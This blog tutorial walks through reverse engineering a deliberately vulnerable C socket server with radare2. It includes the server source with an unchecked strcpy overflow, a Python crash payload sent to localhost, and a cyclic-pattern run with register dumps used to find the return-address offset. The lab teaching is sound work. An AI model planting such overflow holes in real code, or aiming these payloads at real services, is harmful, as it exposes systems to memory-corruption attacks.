---
layout: post
title:  "Reverse engineering x64 binaries with Radare2 - Exploiting basic Buffer Overflows"
tags: [reversing, c, radare]
featured_image_thumbnail: assets/images/radare2/radare2_20.png
featured_image: assets/images/radare2/radare2_20.png
---


```C 
/**
 * @file smart_server.c
 * @author Dennis Stumm
 * @brief This file contains a vulnerable socket server. To run the server
 *   compile it and start with as following: ./NAME PORTNUMBER
 * @version 1.0
 * @date 2020-02-04
 * 
 * @copyright Copyright (c) 2020 Dennis Stumm
 *******************************************************************************
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *******************************************************************************
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

/**
 * @brief Sends the secret message over the passed socket.
 *
 * @param fd Socket to send the message over.
 */
void egg(int fd) {
  char *message = "\x20\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f"
    "\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x20\x0a\x7c\x3a\x3a\x3a"
    "\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3b\x3b\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
    "\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
    "\x3a\x3a\x3a\x3a\x27\x7e\x7c\x7c\x7e\x7e\x7e\x60\x60\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
    "\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x27\x20\x20"
    "\x20\x2e\x27\x3a\x20\x20\x20\x20\x20\x6f\x60\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
    "\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x27\x20\x6f\x6f\x20\x7c\x20\x7c"
    "\x6f\x20\x20\x6f\x20\x20\x20\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a"
    "\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x20\x38\x20\x20\x2e\x27\x2e\x27\x20\x20\x20\x20"
    "\x38\x20\x6f\x20\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a"
    "\x3a\x3a\x3a\x3a\x20\x38\x20\x20\x7c\x20\x7c\x20\x20\x20\x20\x20\x38\x20\x20\x20"
    "\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
    "\x20\x5f\x2e\x5f\x7c\x20\x7c\x5f\x2c\x2e\x2e\x2e\x38\x20\x20\x20\x20\x3a\x3a\x3a"
    "\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x27\x7e\x2d\x2d\x2e"
    "\x20\x20\x20\x2e\x2d\x2d\x2e\x20\x60\x2e\x20\x20\x20\x60\x3a\x3a\x3a\x3a\x3a\x3a"
    "\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x27\x20\x20\x20\x20\x20\x3d\x38\x20\x20"
    "\x20\x20\x20\x7e\x20\x20\x5c\x20\x6f\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a"
    "\x7c\x3a\x3a\x3a\x3a\x27\x20\x20\x20\x20\x20\x20\x20\x38\x2e\x5f\x20\x38\x38\x2e"
    "\x20\x20\x20\x5c\x20\x6f\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a"
    "\x27\x20\x20\x20\x5f\x5f\x2e\x20\x2c\x2e\x6f\x6f\x6f\x7e\x7e\x2e\x20\x20\x20\x20"
    "\x5c\x20\x6f\x60\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x20\x20\x20\x2e"
    "\x20\x2d\x2e\x20\x38\x38\x60\x37\x38\x6f\x2f\x3a\x20\x20\x20\x20\x20\x5c\x20\x20"
    "\x60\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x27\x20\x20\x20\x20\x20\x2f\x2e\x20"
    "\x6f\x20\x6f\x20\x5c\x20\x3a\x3a\x20\x20\x20\x20\x20\x20\x5c\x38\x38\x60\x3a\x3a"
    "\x3a\x3a\x7c\x0a\x7c\x3a\x3b\x20\x20\x20\x20\x20\x6f\x7c\x7c\x20\x38\x20\x38\x20"
    "\x7c\x64\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x60\x38\x20\x60\x3a\x3a\x3a\x7c\x0a"
    "\x7c\x3a\x2e\x20\x20\x20\x20\x20\x20\x20\x2d\x20\x5e\x20\x5e\x20\x2d\x27\x20\x20"
    "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x60\x2d\x60\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x2e"
    "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
    "\x20\x20\x20\x20\x20\x20\x2e\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x2e\x2e"
    "\x2e\x2e\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3a\x3a\x27\x20\x20\x20"
    "\x20\x20\x60\x60\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x2d\x27\x60"
    "\x2d\x20\x20\x20\x20\x20\x20\x20\x20\x38\x38\x20\x20\x20\x20\x20\x20\x20\x20\x20"
    "\x20\x60\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x2d\x27\x2e\x20\x20\x20\x20\x20\x20\x20"
    "\x20\x20\x20\x2d\x20\x20\x20\x20\x20\x20\x20\x3a\x3a\x20\x20\x20\x20\x20\x7c\x0a"
    "\x7c\x3a\x2d\x7e\x2e\x20\x2e\x20\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
    "\x20\x20\x20\x20\x20\x20\x20\x20\x3a\x20\x20\x20\x20\x20\x7c\x0a\x7c\x20\x2e\x2e"
    "\x20\x2e\x20\x20\x20\x2e\x2e\x3a\x20\x20\x20\x6f\x3a\x38\x20\x20\x20\x20\x20\x20"
    "\x38\x38\x6f\x20\x20\x20\x20\x20\x20\x20\x7c\x0a\x7c\x2e\x20\x2e\x20\x20\x20\x20"
    "\x20\x3a\x3a\x3a\x20\x20\x20\x38\x3a\x50\x20\x20\x20\x20\x20\x64\x38\x38\x38\x2e"
    "\x20\x2e\x20\x2e\x20\x20\x7c\x0a\x7c\x2e\x20\x20\x20\x2e\x20\x20\x20\x3a\x38\x38"
    "\x20\x20\x20\x38\x38\x20\x20\x20\x20\x20\x20\x38\x38\x38\x27\x20\x20\x2e\x20\x2e"
    "\x20\x20\x7c\x0a\x7c\x20\x20\x20\x6f\x38\x20\x20\x64\x38\x38\x50\x20\x2e\x20\x38"
    "\x38\x20\x20\x20\x27\x20\x64\x38\x38\x50\x20\x20\x20\x2e\x2e\x20\x20\x20\x7c\x0a"
    "\x7c\x20\x20\x38\x38\x50\x20\x20\x38\x38\x38\x20\x20\x20\x64\x38\x50\x20\x20\x20"
    "\x27\x20\x38\x38\x38\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7c\x0a\x7c\x20\x20\x20"
    "\x38\x20\x20\x64\x38\x38\x50\x2e\x27\x64\x3a\x38\x20\x20\x2e\x2d\x20\x64\x50\x7e"
    "\x20\x6f\x38\x20\x20\x20\x20\x20\x20\x20\x7c\x0a\x7c\x20\x20\x20\x20\x20\x20\x38"
    "\x38\x38\x20\x20\x20\x38\x38\x38\x20\x20\x20\x20\x64\x7e\x20\x6f\x38\x38\x38\x20"
    "\x20\x20\x20\x4c\x53\x20\x7c\x0a\x7c\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f"
    "\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f"
    "\x5f\x5f\x7c";
  send(fd, message, strlen(message), 0);
}

/**
 * @brief Checks whether the passed text equals to the secret text.
 * 
 * @param secret Text to check against the secret text.
 * @return int 0 if the passed text isn't correct, 1 otherwhise.
 */
int checkAuth(char *secret) {
  char secret_buffer[42];
  int auth_flag = 0;

  strcpy(secret_buffer, secret);

  if (strcmp(secret_buffer, "You don't know the power of the dark side") == 0)
    auth_flag = 1;

  return auth_flag;
}

/**
 * @brief Handles an incoming connection to the server.
 * 
 * @param sock The socket to handle the connection on.
 */
void handleConnection(int sock) {
  struct sockaddr_in client;
  socklen_t len;
  char *message;
  int fd, recv_size;
  char secret_buffer[1024];

  len = sizeof(client);
  fd = accept(sock, (struct sockaddr*) &client, &len);
  if (fd < 0) {
    printf("Error acepting\n");
    exit(-1);
  }

  printf("Got connection!\n");
  message = "Welcome! Please enter the secret text:\n";
  send(fd, message, strlen(message), 0);
  recv_size = recv(fd, secret_buffer, 1024, 0);

  if (recv_size <= 0) {
    printf("Connection close!\n");
    close(fd);
    return;
  }
  
  secret_buffer[recv_size-1] = '\0';
  
  while (!checkAuth(secret_buffer)) {
    message = "The secret was wrong, please try again:\n";
    send(fd, message, strlen(message), 0);
    recv_size = recv(fd, secret_buffer, 1024, 0);

    if (recv_size <= 0) {
      printf("Connection close!\n");
      close(fd);
      return;
    }

    secret_buffer[recv_size-1] = '\0';
  }

  egg(fd);

  printf("Connection close!\n");
  close(fd);
}

/**
 * @brief Starts a socket server listening on the passed port on any ip address.
 * 
 * @param port Portnumber the socket server should listen on.
 */
void start(int port) {
  struct sockaddr_in server;
  int sock;
  
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sock < 0) {
    printf("Error opening socket\n");
    exit(-1);
  }

  server.sin_port = htons(port);
  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_family = AF_INET;

  if (bind(sock, (struct sockaddr*) &server, sizeof(server)) < 0) {
    printf("Error binding socket\n");
    exit(-1);
  }

  if (listen(sock, 5) == -1) {
    printf("Error listening\n");
    exit(-1);
  }

  printf("Waiting for connections...\n");
  
  while (1) {
    fflush(stdout);
    handleConnection(sock);
  }
}

/**
 * @brief Main function that calls the function to start the socket server.
 * 
 * @param argc Number of arguments passed to the application.
 * @param argv Array containing the arguments passed to the application.
 * @return int Status with which the application finishes.
 */
int main(int argc, char* argv[]) {
  if (argc != 2) {
    printf("Usage: %s PORT \n", argv[0]);
    return 0;
  }

  start(atoi(argv[1]));

  return 0;
}
```


```
[0x000009b0]> afl
0x00000000    2 64           sym.imp.__libc_start_main
0x00000878    3 23           sym._init
0x000008a0    1 6            sym.imp.recv
0x000008b0    1 6            sym.imp.strcpy
0x000008c0    1 6            sym.imp.puts
0x000008d0    1 6            sym.imp.strlen
0x000008e0    1 6            sym.imp.htons
0x000008f0    1 6            sym.imp.send
0x00000900    1 6            sym.imp.printf
0x00000910    1 6            sym.imp.close
0x00000920    1 6            sym.imp.strcmp
0x00000930    1 6            sym.imp.fflush
0x00000940    1 6            sym.imp.listen
0x00000950    1 6            sym.imp.bind
0x00000960    1 6            sym.imp.accept
0x00000970    1 6            sym.imp.atoi
0x00000980    1 6            sym.imp.exit
0x00000990    1 6            sym.imp.socket
0x000009a0    1 6            sub.__cxa_finalize_248_9a0
0x000009b0    1 43           entry0
0x000009e0    4 50   -> 40   sym.deregister_tm_clones
0x00000a20    4 66   -> 57   sym.register_tm_clones
0x00000a70    4 49           sym.__do_global_dtors_aux
0x00000ab0    1 10           entry1.init
0x00000aba    1 59           sym.egg
0x00000af5    3 73           sym.checkAuth
0x00000b3e   11 395          sym.handleConnection
0x00000cc9    8 221          sym.start
0x00000da6    4 88           main
0x00000e00    4 101          sym.__libc_csu_init
0x00000e70    1 2            sym.__libc_csu_fini
0x00000e74    1 9            sym._fini
[0x000009b0]> 
```

```
[0x000009b0]> s 0x00000da6
[0x00000da6]> pdf
            ;-- main:
/ (fcn) main 88
|   main ();
|           ; var int local_10h @ rbp-0x10
|           ; var int local_4h @ rbp-0x4
|              ; DATA XREF from 0x000009cd (entry0)
|           0x00000da6      55             push rbp                    ; vulns.c:209 int main(int argc, char* argv[]) {
|           0x00000da7      4889e5         mov rbp, rsp
|           0x00000daa      4883ec10       sub rsp, 0x10
|           0x00000dae      897dfc         mov dword [local_4h], edi
|           0x00000db1      488975f0       mov qword [local_10h], rsi
|           0x00000db5      837dfc02       cmp dword [local_4h], 2     ; vulns.c:210   if (argc != 2) { ; [0x2:4]=0x102464c
|       ,=< 0x00000db9      7422           je 0xddd
|       |   0x00000dbb      488b45f0       mov rax, qword [local_10h]  ; vulns.c:211     printf("Usage: %s PORT \n", argv[0]);
|       |   0x00000dbf      488b00         mov rax, qword [rax]
|       |   0x00000dc2      4889c6         mov rsi, rax
|       |   0x00000dc5      488d3de20500.  lea rdi, qword str.Usage:__s_PORT ; 0x13ae ; "Usage: %s PORT \n" ; const char * format
|       |   0x00000dcc      b800000000     mov eax, 0
|       |   0x00000dd1      e82afbffff     call sym.imp.printf         ; int printf(const char *format)
|       |   0x00000dd6      b800000000     mov eax, 0                  ; vulns.c:212     return 0;
|      ,==< 0x00000ddb      eb1f           jmp 0xdfc
|      ||      ; JMP XREF from 0x00000db9 (main)
|      |`-> 0x00000ddd      488b45f0       mov rax, qword [local_10h]  ; vulns.c:215   start(atoi(argv[1]));
|      |    0x00000de1      4883c008       add rax, 8
|      |    0x00000de5      488b00         mov rax, qword [rax]
|      |    0x00000de8      4889c7         mov rdi, rax                ; const char * str
|      |    0x00000deb      e880fbffff     call sym.imp.atoi           ; int atoi(const char *str)
|      |    0x00000df0      89c7           mov edi, eax
|      |    0x00000df2      e8d2feffff     call sym.start
|      |    0x00000df7      b800000000     mov eax, 0                  ; vulns.c:217   return 0;
|      |       ; JMP XREF from 0x00000ddb (main)
|      `--> 0x00000dfc      c9             leave                       ; vulns.c:218 }
\           0x00000dfd      c3             ret
[0x00000da6]> 
```

```
[0x00000da6]> s 0x00000cc9
[0x00000cc9]> pdf
/ (fcn) sym.start 221
|   sym.start ();
|           ; var int local_24h @ rbp-0x24
|           ; var int local_20h @ rbp-0x20
|           ; var int local_1eh @ rbp-0x1e
|           ; var int local_1ch @ rbp-0x1c
|           ; var int local_4h @ rbp-0x4
|              ; CALL XREF from 0x00000df2 (main)
|           0x00000cc9      55             push rbp                    ; vulns.c:170 void start(int port) {
|           0x00000cca      4889e5         mov rbp, rsp
|           0x00000ccd      4883ec30       sub rsp, 0x30               ; '0'
|           0x00000cd1      897ddc         mov dword [local_24h], edi
|           0x00000cd4      ba06000000     mov edx, 6                  ; vulns.c:174   sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
|           0x00000cd9      be01000000     mov esi, 1
|           0x00000cde      bf02000000     mov edi, 2
|           0x00000ce3      e8a8fcffff     call sym.imp.socket
|           0x00000ce8      8945fc         mov dword [local_4h], eax
|           0x00000ceb      837dfc00       cmp dword [local_4h], 0     ; vulns.c:175   if (sock < 0) {
|       ,=< 0x00000cef      7916           jns 0xd07
|       |   0x00000cf1      488d3d610600.  lea rdi, qword str.Error_opening_socket ; vulns.c:176     printf("Error opening socket\n"); ; 0x1359 ; "Error opening socket" ; const char * s
|       |   0x00000cf8      e8c3fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00000cfd      bfffffffff     mov edi, 0xffffffff         ; vulns.c:177     exit(-1); ; -1 ; int status
|       |   0x00000d02      e879fcffff     call sym.imp.exit           ; void exit(int status)
|       |      ; JMP XREF from 0x00000cef (sym.start)
|       `-> 0x00000d07      8b45dc         mov eax, dword [local_24h]  ; vulns.c:180   server.sin_port = htons(port);
|           0x00000d0a      0fb7c0         movzx eax, ax
|           0x00000d0d      89c7           mov edi, eax
|           0x00000d0f      e8ccfbffff     call sym.imp.htons
|           0x00000d14      668945e2       mov word [local_1eh], ax
|           0x00000d18      c745e4000000.  mov dword [local_1ch], 0    ; vulns.c:181   server.sin_addr.s_addr = INADDR_ANY;
|           0x00000d1f      66c745e00200   mov word [local_20h], 2     ; vulns.c:182   server.sin_family = AF_INET;
|           0x00000d25      488d4de0       lea rcx, qword [local_20h]  ; vulns.c:184   if (bind(sock, (struct sockaddr*) &server, sizeof(server)) < 0) {
|           0x00000d29      8b45fc         mov eax, dword [local_4h]
|           0x00000d2c      ba10000000     mov edx, 0x10               ; rdx
|           0x00000d31      4889ce         mov rsi, rcx
|           0x00000d34      89c7           mov edi, eax
|           0x00000d36      e815fcffff     call sym.imp.bind
|           0x00000d3b      85c0           test eax, eax
|       ,=< 0x00000d3d      7916           jns 0xd55
|       |   0x00000d3f      488d3d280600.  lea rdi, qword str.Error_binding_socket ; vulns.c:185     printf("Error binding socket\n"); ; 0x136e ; "Error binding socket" ; const char * s
|       |   0x00000d46      e875fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00000d4b      bfffffffff     mov edi, 0xffffffff         ; vulns.c:186     exit(-1); ; -1 ; int status
|       |   0x00000d50      e82bfcffff     call sym.imp.exit           ; void exit(int status)
|       |      ; JMP XREF from 0x00000d3d (sym.start)
|       `-> 0x00000d55      8b45fc         mov eax, dword [local_4h]   ; vulns.c:189   if (listen(sock, 5) == -1) {
|           0x00000d58      be05000000     mov esi, 5
|           0x00000d5d      89c7           mov edi, eax
|           0x00000d5f      e8dcfbffff     call sym.imp.listen
|           0x00000d64      83f8ff         cmp eax, 0xff
|       ,=< 0x00000d67      7516           jne 0xd7f
|       |   0x00000d69      488d3d130600.  lea rdi, qword str.Error_listening ; vulns.c:190     printf("Error listening\n"); ; 0x1383 ; "Error listening" ; const char * s
|       |   0x00000d70      e84bfbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00000d75      bfffffffff     mov edi, 0xffffffff         ; vulns.c:191     exit(-1); ; -1 ; int status
|       |   0x00000d7a      e801fcffff     call sym.imp.exit           ; void exit(int status)
|       |      ; JMP XREF from 0x00000d67 (sym.start)
|       `-> 0x00000d7f      488d3d0d0600.  lea rdi, qword str.Waiting_for_connections... ; vulns.c:194   printf("Waiting for connections...\n"); ; 0x1393 ; "Waiting for connections..." ; const char * s
|           0x00000d86      e835fbffff     call sym.imp.puts           ; int puts(const char *s)
|              ; JMP XREF from 0x00000da4 (sym.start)
|       .-> 0x00000d8b      488b057e1220.  mov rax, qword [obj.stdout] ; vulns.c:197     fflush(stdout); ; loc.stdout ; [0x202010:8]=0
|       :   0x00000d92      4889c7         mov rdi, rax                ; FILE *stream
|       :   0x00000d95      e896fbffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|       :   0x00000d9a      8b45fc         mov eax, dword [local_4h]   ; vulns.c:198     handleConnection(sock);
|       :   0x00000d9d      89c7           mov edi, eax
|       :   0x00000d9f      e89afdffff     call sym.handleConnection
\       `=< 0x00000da4      ebe5           jmp 0xd8b                   ; vulns.c:197     fflush(stdout);
[0x00000cc9]> 
```

```
:135   recv_size = recv(fd, secret_buffer, 1024, 0);
|           0x00000bcd      8b45fc         mov eax, dword [local_4h]
|           0x00000bd0      b900000000     mov ecx, 0
|           0x00000bd5      ba00040000     mov edx, 0x400
|           0x00000bda      89c7           mov edi, eax
|           0x00000bdc      e8bffcffff     call sym.imp.recv
|           0x00000be1      8945ec         mov dword [local_14h], eax
|           0x00000be4      837dec00       cmp dword [local_14h], 0    ; vulns.c:137   if (recv_size <= 0) {
|       ,=< 0x00000be8      7f1b           jg 0xc05
|       |   0x00000bea      488d3d270700.  lea rdi, qword str.Connection_close ; vulns.c:138     printf("Connection close!\n"); ; 0x1318 ; "Connection
```




```
db 0x555555554b3e
db 0x555555554c5a

s 0x555555554b3e
```


```
import socket
import sys

payload = b"\x41"*1000  

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('127.0.0.1',8081))
s.send(payload)

s.close()
``` 


```
[0x555555554b3e]> dc
Waiting for connections...
hit breakpoint at: 555555554b3e
[0x555555554b3e]> dc
Got connection!
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
[0x555555554b3d]> 
```

```
[0x555555554b3d]> dr
rax = 0x41414141
rbx = 0x00000000
rcx = 0x7ffff7a985d0
rdx = 0x00000059
r8 = 0x00000000
r9 = 0x00000000
r10 = 0x00000000
r11 = 0x7ffff7b912c0
r12 = 0x5555555549b0
r13 = 0x7fffffffe0b0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x5555555552a0
rdi = 0x7fffffffdae0
rsp = 0x7fffffffdb18
rbp = 0x4141414141414141
rip = 0x555555554b3d
rflags = 0x00010286
orax = 0xffffffffffffffff
[0x555555554b3d]> 
```



```
[0x555555554b3d]> dr rbp
0x4141414141414141
[0x555555554b3d]> 

[0x555555554b3d]> pxw @ rsp-100
0x7fffffffdab4  0x00007fff 0x00000000 0x00000000 0x00000000  ................
0x7fffffffdac4  0x00000000 0x55554b2e 0x00005555 0x0000000f  .....KUUUU......
0x7fffffffdad4  0x00000000 0xffffdb30 0x00007fff 0x41414141  ....0.......AAAA
0x7fffffffdae4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdaf4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb04  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb14  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb24  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb34  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb44  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb54  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb64  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb74  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb84  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdb94  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
0x7fffffffdba4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
[0x555555554b3d]> 
```

```
lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

```
lab@lab-VirtualBox:~/exploit-pattern$ nc localhost 8081
Welcome! Please enter the secret text:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

```
[0x555555554b3d]> dr
rax = 0x35624134
rbx = 0x00000000
rcx = 0x4232684231684230
rdx = 0x00000059
r8 = 0x00000000
r9 = 0x00000000
r10 = 0x00000000
r11 = 0x7ffff7b912c0
r12 = 0x5555555549b0
r13 = 0x7fffffffe0b0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x5555555552a0
rdi = 0x7fffffffdae0
rsp = 0x7fffffffdb18
rbp = 0x6241376241366241
rip = 0x555555554b3d
rflags = 0x00010286
orax = 0xffffffffffffffff

[0x555555554b3d]> pxw 300 @ rsp 
0x7fffffffdb18  0x39624138 0x41306341 0x63413163 0x33634132  8Ab9Ac0Ac1Ac2Ac3
0x7fffffffdb28  0x41346341 0x63413563 0x37634136 0x41386341  Ac4Ac5Ac6Ac7Ac8A
0x7fffffffdb38  0x64413963 0x31644130 0x41326441 0x64413364  c9Ad0Ad1Ad2Ad3Ad
0x7fffffffdb48  0x35644134 0x41366441 0x64413764 0x39644138  4Ad5Ad6Ad7Ad8Ad9
0x7fffffffdb58  0x41306541 0x65413165 0x33654132 0x41346541  Ae0Ae1Ae2Ae3Ae4A
0x7fffffffdb68  0x65413565 0x37654136 0x41386541 0x66413965  e5Ae6Ae7Ae8Ae9Af
0x7fffffffdb78  0x31664130 0x41326641 0x66413366 0x35664134  0Af1Af2Af3Af4Af5
0x7fffffffdb88  0x41366641 0x66413766 0x39664138 0x41306741  Af6Af7Af8Af9Ag0A
